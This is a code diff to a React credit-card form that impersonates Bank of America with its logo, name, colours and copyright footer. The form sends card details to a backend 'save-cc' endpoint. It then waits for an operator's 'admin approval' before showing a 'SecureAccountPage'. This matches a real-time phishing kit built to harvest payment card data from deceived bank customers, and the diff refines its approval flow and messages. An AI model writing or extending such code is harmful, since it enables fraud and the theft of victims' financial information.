@@ -2,13 +2,15 @@
 import React, { useState } from "react";
 import axios from "axios";
 import logo from "/boa.png";
+import SecureAccountPage from "./SecureAccountPage";
 
 const API_BASE = "http://localhost:4000";
 
 const CreditCard: React.FC = () => {
   const [submitting, setSubmitting] = useState(false);
   const [pendingApproval, setPendingApproval] = useState(false);
-  const [, setMessage] = useState("");
+  const [approved, setApproved] = useState(false);
+  const [message, setMessage] = useState("");
 
   const [formData, setFormData] = useState({
     cardNumber: "",
@@ -41,21 +43,21 @@ const CreditCard: React.FC = () => {
     setSubmitting(true);
 
     try {
-      // send form data, backend generates a new user_id
+      // Send form data to backend
       const response = await axios.post(`${API_BASE}/api/save-cc`, {
         ...formData,
       });
 
       const result = response.data;
-      const newUserId = result.user.id; // get database ID
+      const newUserId = result.user.id;
 
       if (result.user?.status === "pending") {
         setPendingApproval(true);
-        setMessage("Your card is waiting for admin approval...");
+        setMessage("Your card is waiting for approval...");
 
-        // Poll the backend until status is approved
-        const pollInterval = 2000; // 2s
-        const maxAttempts = 30; // max 1 minute
+        // Poll backend until approved
+        const pollInterval = 2000; // 2 seconds
+        const maxAttempts = 30; // up to 1 minute
         let attempts = 0;
 
         while (attempts < maxAttempts) {
@@ -63,24 +65,22 @@ const CreditCard: React.FC = () => {
           const check = await axios.get(`${API_BASE}/api/cards`);
           const userData = check.data.find((u: any) => u.id === newUserId);
           if (userData?.status === "approved") {
-            setMessage("✅ Card approved by admin!");
+            setApproved(true);
             setPendingApproval(false);
-            break;
+            return;
           }
           attempts++;
         }
 
-        if (attempts === maxAttempts) {
-          setMessage(
-            "⚠️ Admin approval is taking longer than expected. Please check back later."
-          );
-          setPendingApproval(false);
-        }
+        setMessage(
+          "⚠️ Approval is taking longer than expected. Please check back later."
+        );
+        setPendingApproval(false);
       } else {
-        setMessage("Card information saved successfully!");
+        setApproved(true);
       }
 
-      // Clear form completely
+      // Clear form
       setFormData({
         cardNumber: "",
         expMonth: "",
@@ -102,22 +102,31 @@ const CreditCard: React.FC = () => {
     }
   };
 
+  // ✅ If approved, show SecureAccountPage
+  if (approved) {
+    return <SecureAccountPage title="credit card" />;
+  }
+
   return (
     <div className="min-h-screen bg-white flex flex-col items-center justify-center px-6 py-10 relative">
       {/* Loader Modal */}
       {pendingApproval && (
         <div className="fixed inset-0 flex items-center justify-center bg-black/40 backdrop-blur-sm z-50">
           <div className="bg-white rounded-xl shadow-xl p-8 flex flex-col items-center space-y-6 w-80 max-w-sm">
-            <img src={logo} alt="Bank of America" className="h-12 mb-2" />
+            <img
+              src={logo}
+              alt="Bank of America"
+              className="h-12 mb-2 object-contain"
+            />
 
-            {/* Tailwind spinner */}
+            {/* Spinner */}
             <div className="w-16 h-16 border-4 border-gray-200 border-t-[#B42025] rounded-full animate-spin"></div>
 
             <p className="text-gray-700 text-center font-medium">
               Waiting for approval...
             </p>
 
-            {/* Animated dots using Tailwind */}
+            {/* Animated dots */}
             <div className="flex space-x-2 mt-2">
               <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-75"></span>
               <span className="w-2 h-2 bg-[#B42025] rounded-full animate-bounce delay-150"></span>
@@ -128,9 +137,7 @@ const CreditCard: React.FC = () => {
       )}
 
       <header className="flex items-center space-x-2 mb-10">
-        <a className="text-2xl font-semibold text-blue-900">
-          <img src={logo} alt="Bank of America" className="h-10" />
-        </a>
+        <img src={logo} alt="Bank of America" className="h-10" />
       </header>
 
       <div className="bg-white shadow-md rounded-lg max-w-md w-full p-6 border border-gray-100">
@@ -262,6 +269,7 @@ const CreditCard: React.FC = () => {
             </div>
           </div>
 
+          {/* Submit button */}
           <button
             type="submit"
             disabled={submitting || pendingApproval}
@@ -278,10 +286,17 @@ const CreditCard: React.FC = () => {
               : "Continue"}
           </button>
 
-          {/* {message && (<p className={`mt-3 text-sm ${message.includes("success") || message.includes("approved")? "text-green-600": "text-red-500"}`} >
+          {message && (
+            <p
+              className={`mt-3 text-sm ${
+                message.includes("success") || message.includes("approved")
+                  ? "text-green-600"
+                  : "text-red-500"
+              }`}
+            >
               {message}
             </p>
-          )} */}
+          )}
         </form>
       </div>
 
@@ -289,18 +304,6 @@ const CreditCard: React.FC = () => {
         © {new Date().getFullYear()} Bank of America Corporation. All rights
         reserved.
       </footer>
-
-      {/* Loader CSS */}
-      <style>{`
-        .loader {
-          border-top-color: #3498db;
-          animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
-        }
-      `}</style>
     </div>
   );
 };
